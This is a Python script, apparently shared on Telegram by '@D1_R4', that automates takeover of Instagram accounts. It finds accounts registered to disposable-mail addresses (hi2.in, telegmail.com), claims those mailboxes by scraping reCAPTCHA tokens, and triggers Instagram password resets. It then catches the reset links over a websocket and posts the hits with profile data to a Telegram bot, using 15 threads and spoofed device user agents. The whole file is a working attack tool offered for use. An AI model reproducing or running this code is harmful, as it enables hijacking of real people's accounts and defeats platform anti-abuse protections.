# @D1_R4 اداة مجانية غير مسموح البيع
import sys, os, time, random, json, uuid, re, base64, threading, requests, httpx, websocket
from bs4 import BeautifulSoup
from datetime import datetime
from threading import Thread, Lock
import subprocess

try:
    import h2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2

try:
    import httpx
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
    import httpx

F = '\033[2;32m'
YELLOW = '\033[1;33m'
ED = '\x1b[38;5;208m'
bo = '\033[2;36m'
M = '\x1b[1;37m'
J = '\033[2;36m'
N = '\033[1;37m'
R = '\033[1;31m'  
G = '\033[1;32m'   
P = '\033[1;35m'  
C = '\033[1;36m'   
G = '\033[1;32m'   
Y = '\033[1;33m'   
W = '\033[1;37m'   
Bl = '\033[1;34m'  

TIMEOUT = 45

used_usernames = set()
lock = Lock()
hit = 0
badig = 0
badmil = 0
goodig = 0
dead = 0
rest_ok = 0

def safe_parse_json(text):
    text = text.strip()
    if '}{' in text: text = text.split('}{')[0] + '}'
    return json.loads(text)

def create_ws(**kwargs):
    return websocket.WebSocketApp(**kwargs)

def solve_recaptcha():
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
        params = anchor_url.split('?')[1]
        r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{params}', timeout=15)
        token = r.text.split('recaptcha-token" value="')[1].split('"')[0] if 'recaptcha-token" value="' in r.text else r.text.split('type="hidden" id="recaptcha-token" value="')[1].split('"')[0]
        payload = f"v={params.split('v=')[1].split('&')[0]}&reason=q&c={token}&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&size=invisible"
        headers = {"User-Agent": "Mozilla/5.0", "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{params}", "Content-Type": "application/x-www-form-urlencoded"}
        resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=payload, headers=headers, timeout=15)
        return resp.text.split('resp","')[1].split('"')[0]
    except: return None

def generate_android_ua():
    devices = [
        {"brand": "samsung", "model": "SM-G973F", "device": "beyond1", "board": "exynos9820", "cpu": "exynos9820"},
        {"brand": "Google", "model": "Pixel 7", "device": "panther", "board": "panther", "cpu": "gs201"},
        {"brand": "Xiaomi", "model": "M2102J20SG", "device": "ares", "board": "mt6893", "cpu": "mtk"},
    ]
    device = random.choice(devices)
    android_version = random.choice(["10","11","12","13","14"])
    api_level = {"10":"29","11":"30","12":"31","13":"33","14":"34"}[android_version]
    dpi = random.choice(["320","360","420","480"])
    width = random.choice(["720","1080","1440"])
    height = random.choice(["1520","1600","2280","2340","2560"])
    instagram_ver = f"{random.randint(280,340)}.0.0.{random.randint(10,40)}.{random.randint(80,150)}"
    locale = random.choice(["en_US", "en_GB", "ar_SA"])
    random_num = random.randint(300000000, 400000000)
    return f"Instagram {instagram_ver} Android ({api_level}/{android_version}; {dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; {device['device']}; {device['board']}; {locale}; {random_num})"

def wrest_reset_email(full_email):
    try:
        android_ua = generate_android_ua()
        ig_did = str(uuid.uuid4()).upper()
        mid = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
        headers = {
            "User-Agent": android_ua,
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "x-ig-app-id": "567067343352427",
            "x-ig-device-id": ig_did,
            "x-ig-connection-type": "WIFI",
            "x-ig-capabilities": "3brTvw==",
            "x-ig-www-claim": "0",
            "x-requested-with": "XMLHttpRequest",
            "x-csrftoken": "missing",
            "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
            "Origin": "https://www.instagram.com",
            "Referer": "https://instagram.com/accounts/password/reset/?source=fxcal"
        }
        httpx.Client(http2=True, timeout=20).post(
            "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
            data={"email_or_username": full_email},
            headers=headers
        )
        return True
    except: return False

def extract_info(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    username = "Unknown"
    
    full_text = soup.get_text()
    match = re.search(r'Log\s*in\s*as\s+([^\s<]+)', full_text, re.IGNORECASE)
    if match:
        username = match.group(1)
    else:

        for td in soup.find_all('td'):
            text = td.get_text().strip()
            if not text or text.startswith('<') or len(text) > 50:
                continue
            if '@' in text or 'http' in text:
                continue
            if 'log in as' in text.lower() or 'instagram' in text.lower():
                continue
            if any(c.isalpha() for c in text) and not text.startswith('http'):
                if len(text) > 2:
                    username = text
                    break
    
    for a in soup.find_all('a', href=True):
        if 'password/reset/confirm' in a['href'] or 'password_reset' in a['href']:
            return username, a['href']
    
    return username, "Not found"

def do_rest(email):
    global rest_ok
    prefix, domain = email.split('@')
    
    captcha = solve_recaptcha()
    if not captcha: return None, None
    
    try:
        resp = requests.post("https://hi2.in/api/custom",
                           data={'domain': domain, 'prefix': prefix, 'recaptcha': captcha},
                           headers={'User-Agent': "Mozilla/5.0", 'Authorization': "Basic bnVsbA=="},
                           timeout=15)
        res = safe_parse_json(resp.text)
        if 'email' not in res: return None, None
        token = f"{res['expiry']}-{res['email']}-{res['hash']}"
    except: return None, None
    
    got_link = []
    got_username = []
    ws_closed = threading.Event()
    
    def on_message(ws, message):
        if ws_closed.is_set(): return
        if message == "ping": ws.send("pong"); return
        if "online" in message or message == "pong": return
        if not message or not message.strip(): return
        message = message.strip()
        if not (message.startswith('{') or message.startswith('[')): return
        try: data = json.loads(message)
        except: return
        if isinstance(data, dict) and 'body' in data and 'html' in data['body']:
            html = data['body']['html']
            username, link = extract_info(html)
            if username != "Unknown": got_username.append(username)
            if link != "Not found":
                got_link.append(link)
                rest_ok += 1
                ws_closed.set()
                ws.close()
    
    def on_open(ws):
        try:
            ws.send(token)
            wrest_reset_email(email)
        except:
            ws_closed.set()
    
    ws = create_ws(url="wss://ws.checker.in:8443", on_open=on_open, on_message=on_message)
    t = threading.Thread(target=ws.run_forever); t.daemon = True; t.start()
    ws_closed.wait(timeout=TIMEOUT)
    try: ws.close()
    except: pass
    
    username = got_username[0] if got_username else "Unknown"
    link = got_link[0] if got_link else None
    return username, link



def send_telegram(token, chat_id, msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data={
                "chat_id": chat_id,
                "text": msg,
                "parse_mode": "HTML"
            },
            timeout=10
        )
    except: pass
    
def get_user_info(username, link=""):
    headers = {
        "authority": "insta-story.com",
        "accept": "*/*",
        "accept-language": "tr-TR,tr;q=0.9",
        "content-type": "application/json",
        "origin": "https://insta-story.com",
        "referer": f"https://insta-story.com/user/{username}",
        "user-agent": "Mozilla/5.0 (Linux; Android 10) Chrome/137.0.0.0 Mobile"
    }

    json_data = {
        "username": username,
        "visitor_id": str(uuid.uuid4()),
        "user_info": True,
        "user_stories": False,
        "user_highlights": False,
        "user_posts": False
    }

    try:
        r = requests.post(
            "https://insta-story.com/api/v1/web/profile",
            headers=headers,
            json=json_data,
            timeout=15
        ).json()

        if r.get("user_info"):
            u = r["user_info"]
            inf = f'⌊ Name ⌉  {u.get("full_name", "Yok")}\n'
            inf += f'⌊ Username ⌉  @{username}\n'
            inf += f'⌊ ID ⌉  {u.get("id", "Yok")}\n'
            inf += f'⌊ Followers ⌉  {u.get("followers", 0)}\n'
            inf += f'⌊ Following ⌉  {u.get("following", 0)}\n'
            inf += f'⌊ Posts ⌉  {u.get("posts", 0)}\n'
            inf += f'⌊ Private ⌉  {"Yes" if u.get("is_private") else "No"}\n'
            if link:
                
                inf += f'⌊ <a href="{link}">Reset Link</a> ⌉\n'
            inf += f'⌊ URL ⌉  https://www.instagram.com/{username}/\n'
            return inf
        else:
            raise Exception
    except:
        inf = f'⌊ Username ⌉  @{username}\n'
        if link:

            inf += f'⌊ <a href="{link}">Reset Link</a> ⌉\n'
            
        inf += f'⌊ URL ⌉  https://www.instagram.com/{username}/\n'
        return inf
            
def check_instagram_user(email, token, chat_id):
    global dead, hit, rest_ok
    try:
        iphone_models = ["iPhone15,2", "iPhone14,7", "iPhone13,2", "iPhone12,1"]
        ios_versions = ["16.0", "16.1", "17.0", "17.1", "17.2"]
        user_agent = f'Mozilla/5.0 (iPhone; CPU iPhone OS {random.choice(ios_versions)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.choice(ios_versions)} Mobile/15E148 Safari/604.1'
        
        with httpx.Client() as client:
            response = client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_ajax/",
                data={'query': email},
                headers={
                    'User-Agent': user_agent,
                    'x-ig-app-id': '1217981644879628',
                    'x-requested-with': 'AHMED',
                    'x-instagram-ajax': '1020156280',
                    'x-csrftoken': 'messing',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/accounts/login/',
                    'accept-language': 'en-US'
                }
            )
        
        data = response.json()
        
        if data.get('status') == 'fail' and data.get('message') == 'No users found':
            dead += 1
            return
        
        print(f"\n{F}[+] Found: {email} - Getting reset link...")
        username, link = do_rest(email)
        
        dom = email.split("@")[1]
        msg = email

# تم حذف جميع الإضافات الخاصة بـ Guts و By @D1_R4 والروابط

        send_telegram(token, chat_id, msg)
        with open('hits1.txt', 'a') as ff:
            ff.write(f'{msg}\n\n')

        
        hit += 1
        
    except Exception as e:
        pass
        
def check_hi2_available(email, token, chat_id):
    global badmil
    domain = email.split("@")[1]
    prefix = email.split("@")[0]
    
    solve = solve_recaptcha()
    if not solve: return
    
    data = {'domain': domain, 'prefix': prefix, 'recaptcha': solve}
    headers = {
        'User-Agent': "Mozilla/5.0",
        'Accept': "application/json, text/plain, */*",
        'authorization': "Basic bnVsbA==",
    }
    
    try:
        response = requests.post("https://hi2.in/api/custom", data=data, headers=headers)
        res = response.json()
        if "already taken" in str(res):
            badmil += 1
        else:
            check_instagram_user(email, token, chat_id)
    except: pass

def check_email_ig(email, token, chat_id):
    global badig,goodig
    try:
        response = httpx.Client(http2=True).post(
            "https://i.instagram.com/api/v1/users/check_email/",
            data=f"email={email}",
            headers={
                'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
            }
        )
        
        if 'email_is_taken' in response.text:
            goodig += 1
            check_hi2_available(email, token, chat_id)
        else:
            badig += 1
    except: pass

def hunter(token, chat_id):
    global badig, badmil, hit, dead
    while True:
        u = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(6))
        d = random.choice(["@hi2.in","@telegmail.com"])
        email = u + d
        
        with lock:
            if u in used_usernames:
                continue
            used_usernames.add(u)
        
        check_email_ig(email, token, chat_id)
        
        os.system('clear' if os.name == 'posix' else 'cls')
        tt = f'''
{Bl}━━━━━━━━━━━━━━━━━━━━━━{Bl}
{W}⚡ HITS     {Bl}: {G}{hit}{W}
{Bl}━━━━━━━━━━━━━━━━━━━━━━{Bl}
{W}📧 Good IG  {Bl}: {C}{goodig}{W}
{W}📭 Bad Mail {Bl}: {Y}{badmil}{W}
{W}💀 Bad IG   {Bl}: {R}{badig}{W}
{W}🪦 Dead     {Bl}: {R}{dead}{W}
{Bl}━━━━━━━━━━━━━━━━━━━━━━{Bl}
{W}👤 By: @D1_R4{W}
'''
        print(tt)


def main():
    banner()
    print()
    # قراءة التوكن والآيدي من متغيرات البيئة (Railway) أو طلبها يدوياً لو لم تكن موجودة
    token = os.environ.get("TOKEN")
    ID = os.environ.get("ID")
    
    if not token:
        token = input("Enter Your Token: ").strip()
    print()
    if not ID:
        ID = input("Enter ID: ").strip()
    
    os.system('clear' if os.name == 'posix' else 'cls')
    
    for _ in range(15):
        Thread(target=hunter, args=(token, ID), daemon=True).start()
    
    while True:
        time.sleep(1)


def banner():
    try:
        from cfonts import render
        WDEH = render('{END}', colors=['red', 'white'], align='center')
        print(f'''{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
 {N}DEV / @D1_R4{J}| {N} Ch:@D1_R444{J}| {N}PROGRAMMER /Naif
{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')
    except:
        print(f'''{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
 {N}DEV / @D1_R4{J}| {N} Ch:@D1_R444{J}| {N}PROGRAMMER /Naif
{J}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\n[!] Stopped")
    
#ممنوع الخمط اذكر المصدر !!
